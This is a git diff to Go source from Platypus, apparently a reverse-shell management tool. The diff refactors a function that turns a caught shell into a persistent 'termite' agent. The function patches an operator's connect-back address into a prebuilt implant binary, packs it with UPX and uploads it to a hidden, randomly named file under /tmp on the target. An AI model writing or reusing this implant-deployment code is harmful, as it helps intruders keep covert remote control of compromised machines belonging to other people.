@@ -18,7 +18,6 @@ import (
 	"github.com/WangYihang/Platypus/lib/util/hash"
 	"github.com/WangYihang/Platypus/lib/util/log"
 	oss "github.com/WangYihang/Platypus/lib/util/os"
-	"github.com/WangYihang/Platypus/lib/util/resource"
 	"github.com/WangYihang/Platypus/lib/util/str"
 	humanize "github.com/dustin/go-humanize"
 	"github.com/jedib0t/go-pretty/table"
@@ -350,7 +349,6 @@ func (c *TCPClient) tryReadEcho(echo string) (bool, string) {
 		// Set read time out
 		c.conn.SetReadDeadline(time.Now().Add(time.Second * 1))
 		n, err := c.ReadConnLock(inputBuffer)
-		// fmt.Println(string(inputBuffer), string(ch))
 		if err == nil {
 			outputBuffer.Write(inputBuffer[:n])
 			if byte(ch) != inputBuffer[0] {
@@ -858,39 +856,26 @@ func (c *TCPClient) UpgradeToTermite(connectBackHostPort string) {
 		return
 	}
 
-	// Compiler termite binary
-	dir, err := ioutil.TempDir("/tmp", "termites")
+	// Step 0: Generate temp folder and filename
+	dir, filename, err := compiler.GenerateDirFilename()
 	if err != nil {
 		log.Error(fmt.Sprint(err))
+		return
 	}
-	target := fmt.Sprintf("%s/%s-%s-termite", dir, time.Now().Format("2006-01-02-15:04:05"), str.RandomString(0x10))
+	defer os.RemoveAll(dir)
 
 	// Step 1: Generate Termite from Assets
 	c.NotifyWebSocketCompilingTermite(0)
-	content, _ := resource.Asset("termites/termite_linux_amd64")
-	c.NotifyWebSocketCompilingTermite(25)
-
-	// BUG: Something, the public ip address is not one of the interface addresses
-	// eg: Alibaba Cloud, the public ip is not in machine interface ip addresses
-	placeHolder := "xxx.xxx.xxx.xxx:xxxxx"
-	replacement := make([]byte, len(placeHolder))
-	for i := 0; i < len(connectBackHostPort); i++ {
-		replacement[i] = connectBackHostPort[i]
-	}
-	log.Success("Replacing `%s` to: `%s`", placeHolder, replacement)
-	content = bytes.Replace(content, []byte(placeHolder), replacement, 1)
-	c.NotifyWebSocketCompilingTermite(50)
-	err = ioutil.WriteFile(target, content, 0755)
-	c.NotifyWebSocketCompilingTermite(75)
+	err = compiler.BuildTermiteFromPrebuildAssets(filename, connectBackHostPort)
 	if err != nil {
 		c.NotifyWebSocketCompilingTermite(-1)
-		return
+	} else {
+		c.NotifyWebSocketCompilingTermite(100)
 	}
-	c.NotifyWebSocketCompilingTermite(100)
 
 	// Step 2: Upx compression
 	c.NotifyWebSocketCompressingTermite(0)
-	if !compiler.Compress(target) {
+	if !compiler.Compress(filename) {
 		c.NotifyWebSocketCompressingTermite(-1)
 	} else {
 		c.NotifyWebSocketCompressingTermite(100)
@@ -898,7 +883,7 @@ func (c *TCPClient) UpgradeToTermite(connectBackHostPort string) {
 
 	// Upload Termite Binary
 	dst := fmt.Sprintf("/tmp/.%s", str.RandomString(0x10))
-	if !c.Upload(target, dst, true) {
+	if !c.Upload(filename, dst, true) {
 		log.Error("Upload failed")
 		return
 	}
